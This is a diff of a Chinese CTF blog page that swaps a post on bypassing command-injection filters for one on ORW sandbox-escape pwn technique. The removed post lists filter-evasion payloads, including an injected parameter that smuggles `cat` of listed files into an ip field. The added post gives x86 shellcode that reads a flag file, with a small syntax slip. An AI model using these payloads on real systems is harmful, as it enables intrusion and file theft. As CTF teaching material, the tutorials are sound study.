@@ -24,7 +24,7 @@
 
   
 
-  <title>命令执行漏洞过滤的一些简单绕过 | LittleHamster</title>
+  <title>PWN溢出技巧：ORW解题技巧 | LittleHamster</title>
 
   
 
@@ -101,11 +101,11 @@
     <div class="header-content">
       <div class="post-text layout-block">
         <div class="layout-margin">
-          <h1 class="title-wrap">命令执行漏洞过滤的一些简单绕过</h1>
+          <h1 class="title-wrap">PWN溢出技巧：ORW解题技巧</h1>
           <h2 class="title-sub-wrap">
             <strong>LittleHamster1</strong>
             <span>发布于</span>
-            <time  class="article-date" datetime="2024-03-24T13:09:47.000Z" itemprop="datePublished">2024-03-24</time>
+            <time  class="article-date" datetime="2024-04-26T05:59:41.000Z" itemprop="datePublished">2024-04-26</time>
           </h2>
           
           
@@ -114,7 +114,7 @@
 </ul>
           <ul class="wrap-list dark">
   
-    <li><a href="/tags/web/">🏷️ web</a></li>
+    <li><a href="/tags/pwn/">🏷️ pwn</a></li>
   
 </ul>
         </div>
@@ -138,21 +138,15 @@
       
       
       <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
-        <h1 id="命令执行漏洞过滤的一些简单绕过"><a href="#命令执行漏洞过滤的一些简单绕过" class="headerlink" title="命令执行漏洞过滤的一些简单绕过"></a>命令执行漏洞过滤的一些简单绕过</h1><h2 id="一、空格过滤"><a href="#一、空格过滤" class="headerlink" title="一、空格过滤"></a>一、空格过滤</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$&#123;IFS&#125;$9</span><br><span class="line">&#123;IFS&#125;</span><br><span class="line">$IFS</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$1 //$1改成$加其他数字貌似都行</span><br><span class="line">IFS</span><br><span class="line">&lt; </span><br><span class="line">&lt;&gt; </span><br><span class="line">&#123;cat,flag.php&#125;  //用逗号实现了空格功能，需要用&#123;&#125;括起来</span><br><span class="line">%20   (space)</span><br><span class="line">%09   (tab)</span><br><span class="line">X=$&#x27;cat\x09./flag.php&#x27;;$X       （\x09表示tab，也可以用\x20）</span><br></pre></td></tr></table></figure>
+        <h1 id="ORW"><a href="#ORW" class="headerlink" title="ORW"></a>ORW</h1><blockquote>
+<p><code>ORW</code>类题目是指程序开了沙箱保护，禁用了一些函数的调用（如 <code>execve</code>等），使得我们并不能正常 <code>get shell</code>，只能通过<code>ROP</code>的方式调用<code>open</code>, <code>read</code>, <code>write</code>的来读取并打印<code>flag</code> 内容</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fd = open(&#x27;/flag&#x27;,&#x27;r&#x27;)</span><br><span class="line">read(fd,buf,len)</span><br><span class="line">write(1,buf,len)</span><br></pre></td></tr></table></figure>
 
-<h2 id="二、过滤cat"><a href="#二、过滤cat" class="headerlink" title="二、过滤cat"></a>二、过滤cat</h2><h3 id="1、替代法"><a href="#1、替代法" class="headerlink" title="1、替代法"></a>1、替代法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">more:一页一页的显示档案内容</span><br><span class="line">less:与 more 类似</span><br><span class="line">head:查看头几行</span><br><span class="line">tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class="line">tail:查看尾几行</span><br><span class="line">nl：显示的时候，顺便输出行号</span><br><span class="line">od:以二进制的方式读取档案内容</span><br><span class="line">vi:一种编辑器，这个也可以查看</span><br><span class="line">vim:一种编辑器，这个也可以查看</span><br><span class="line">sort:可以查看</span><br><span class="line">uniq:可以查看</span><br><span class="line">file -f:报错出具体内容</span><br><span class="line">sh /flag 2&gt;%261 //报错出文件内容</span><br></pre></td></tr></table></figure>
+<h1 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h1><h2 id="1、查看沙箱"><a href="#1、查看沙箱" class="headerlink" title="1、查看沙箱"></a>1、查看沙箱</h2><p>在实战中我们可以通过 <code>seccomp-tools</code>来查看程序是否启用了沙箱, <code>seccomp-tools</code>工具安装方法如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gcc ruby-dev</span><br><span class="line">gem install seccomp-tools</span><br></pre></td></tr></table></figure>
 
-<h3 id="2、使用转义符号"><a href="#2、使用转义符号" class="headerlink" title="2、使用转义符号"></a>2、<strong>使用转义符号</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ca\t /fl\ag</span><br><span class="line">cat fl&#x27;&#x27;ag</span><br></pre></td></tr></table></figure>
-
-<h3 id="3、拼接法"><a href="#3、拼接法" class="headerlink" title="3、拼接法"></a>3、<strong>拼接法</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=fl;b=ag;cat$IFS$a$b</span><br></pre></td></tr></table></figure>
-
-<h3 id="4、使用空变量-和-，-x-x-绕过"><a href="#4、使用空变量-和-，-x-x-绕过" class="headerlink" title="4、使用空变量$*和$@，$x,${x}绕过"></a>4、使用空变量$*和$@，$x,${x}绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ca$*t flag</span><br><span class="line">ca$@t flag</span><br><span class="line">ca$5t flag</span><br><span class="line">ca$&#123;5&#125;t flag</span><br></pre></td></tr></table></figure>
-
-<h3 id="5、反引号绕过"><a href="#5、反引号绕过" class="headerlink" title="5、反引号绕过"></a>5、反引号绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat `ls`</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="三、内联执行绕过"><a href="#三、内联执行绕过" class="headerlink" title="三、内联执行绕过"></a>三、内联执行绕过</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;cat$IFS$9`ls`</span><br><span class="line"></span><br><span class="line">$IFS在Linux下表示为空格</span><br><span class="line">$9是当前系统shell进程第九个参数持有者，始终为空字符串，$后可以接任意数字</span><br><span class="line">这里$IFS$9或$IFS垂直，后面加个$与&#123;&#125;类似，起截断作用</span><br></pre></td></tr></table></figure>
+<h2 id="2、利用read-open-write读取flag"><a href="#2、利用read-open-write读取flag" class="headerlink" title="2、利用read,open,write读取flag"></a>2、利用read,open,write读取flag</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#fd = open(&#x27;/home/orw/flag&#x27;,0) </span><br><span class="line">s = &#x27;&#x27;&#x27; xor edx,edx; mov ecx,0; mov ebx,0x804a094; mov eax,5; int 0x80; &#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">#read(fd,0x804a094,0x20) </span><br><span class="line">s += &#x27;&#x27;&#x27; mov edx,0x40; mov ecx,ebx; mov ebx,eax; mov eax,3; int 0x80; &#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">#write(1,0x804a094,0x20) </span><br><span class="line">s += &#x27;&#x27;&#x27; mov edx,0x40; mov ebx,1; mov eax,4 int 0x80; &#x27;&#x27;&#x27;</span><br><span class="line">pd = asm(s)+b&#x27;/home/orw/flag\x00&#x27;</span><br></pre></td></tr></table></figure>
 
 
       </section>
@@ -161,20 +155,20 @@
       
         <nav class="article-nav">
           
+          
             <div class="article-nav-item layout-padding">
   <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
     
     <div class="card-text">
       
-        <a href="/2024/03/24/pwn%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" itemprop="url">
-          <h2 class="card-text--title text-ellipsis">pwn基础知识</h2>
+        <a href="/2024/04/22/TCP%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E5%92%8C%E5%9B%9B%E6%AC%A1%E6%8C%A5%E6%89%8B/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">TCP三次握手和四次挥手</h2>
         </a>
       
-      <div class="card-text--row">Newer</div>
+      <div class="card-text--row">Older</div>
     </div>
   </article>
 </div>
-          
           
         </nav>
       
